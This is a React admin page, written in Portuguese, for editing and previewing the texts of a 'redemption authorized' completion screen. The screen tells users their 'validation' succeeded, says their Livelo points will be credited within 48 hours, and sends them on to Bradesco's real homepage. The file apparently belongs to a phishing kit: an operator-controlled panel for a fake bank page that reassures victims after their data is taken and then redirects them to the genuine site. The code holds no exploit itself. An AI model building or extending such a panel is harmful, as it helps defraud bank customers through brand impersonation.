import { useEffect, useState } from "react";
import { configRepository } from "@/repositories";
import { Save, FileText } from "lucide-react";

interface CompleteTexts {
  titulo: string;
  subtitulo: string;
  mensagem: string;
  botao: string;
  botao_url: string;
}

const DEFAULTS: CompleteTexts = {
  titulo: "Resgate Autorizado!",
  subtitulo: "Sua validação foi concluída com sucesso.",
  mensagem: "O resgate dos seus pontos Livelo será processado em até 48 horas úteis.",
  botao: "Voltar ao Início",
  botao_url: "https://banco.bradesco/html/classic/index.shtm",
};

const FIELDS: { key: keyof CompleteTexts; label: string; type: "text" | "textarea" | "url" }[] = [
  { key: "titulo", label: "Título principal", type: "text" },
  { key: "subtitulo", label: "Subtítulo", type: "text" },
  { key: "mensagem", label: "Mensagem de processamento", type: "textarea" },
  { key: "botao", label: "Texto do botão", type: "text" },
  { key: "botao_url", label: "URL do botão", type: "url" },
];

export default function AdminCompleteTextsPage() {
  const [texts, setTexts] = useState<CompleteTexts>(DEFAULTS);
  const [original, setOriginal] = useState<CompleteTexts>(DEFAULTS);
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);

  useEffect(() => {
    configRepository.getByKeys(["complete_texts"]).then((rows) => {
      const row = rows.find((r) => r.config_key === "complete_texts");
      if (row?.config_value) {
        const val = typeof row.config_value === "string"
          ? JSON.parse(row.config_value)
          : row.config_value;
        const merged = { ...DEFAULTS, ...val };
        setTexts(merged);
        setOriginal(merged);
      }
    });
  }, []);

  const dirty = JSON.stringify(texts) !== JSON.stringify(original);

  const handleSave = async () => {
    setSaving(true);
    await configRepository.upsert("complete_texts", texts as any);
    setOriginal({ ...texts });
    setSaving(false);
    setSaved(true);
    setTimeout(() => setSaved(false), 3000);
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-foreground">Tela de Conclusão</h1>
          <p className="text-sm text-muted-foreground mt-1">
            Edite os textos exibidos na página de resgate concluído
          </p>
        </div>
        <button
          onClick={handleSave}
          disabled={saving || !dirty}
          className="flex items-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
        >
          <Save className="h-4 w-4" />
          {saving ? "Salvando..." : "Salvar"}
        </button>
      </div>

      {saved && (
        <div className="rounded-lg bg-accent border border-accent-foreground/20 px-4 py-3 text-sm text-accent-foreground">
          Textos salvos com sucesso!
        </div>
      )}

      <div className="rounded-xl border border-border bg-card p-5 space-y-5">
        <div className="flex items-center gap-2 mb-1">
          <FileText className="h-4 w-4 text-muted-foreground" />
          <span className="text-sm font-medium text-foreground">Campos editáveis</span>
        </div>

        {FIELDS.map((field) => (
          <div key={field.key} className="space-y-1.5">
            <label className="text-sm font-medium text-foreground">{field.label}</label>
            {field.type === "textarea" ? (
              <textarea
                value={texts[field.key]}
                onChange={(e) => setTexts((prev) => ({ ...prev, [field.key]: e.target.value }))}
                rows={3}
                className="w-full rounded-lg border border-input bg-background px-4 py-3 text-sm outline-none focus:ring-2 focus:ring-ring resize-none"
              />
            ) : (
              <input
                type={field.type}
                value={texts[field.key]}
                onChange={(e) => setTexts((prev) => ({ ...prev, [field.key]: e.target.value }))}
                className="w-full rounded-lg border border-input bg-background px-4 py-3 text-sm outline-none focus:ring-2 focus:ring-ring"
              />
            )}
          </div>
        ))}
      </div>

      {/* Preview */}
      <div className="rounded-xl border border-border bg-card p-5 space-y-3">
        <span className="text-sm font-medium text-foreground">Prévia</span>
        <div className="rounded-lg bg-muted p-5 space-y-2">
          <h2 className="text-lg font-bold text-foreground">{texts.titulo}</h2>
          <p className="text-sm text-muted-foreground">{texts.subtitulo}</p>
          <p className="text-sm text-muted-foreground mt-3">{texts.mensagem}</p>
          <div className="mt-4 rounded-full border border-border px-4 py-2 text-center text-sm font-semibold text-foreground">
            {texts.botao}
          </div>
          <p className="text-xs text-muted-foreground text-center mt-1 truncate">{texts.botao_url}</p>
        </div>
      </div>
    </div>
  );
}
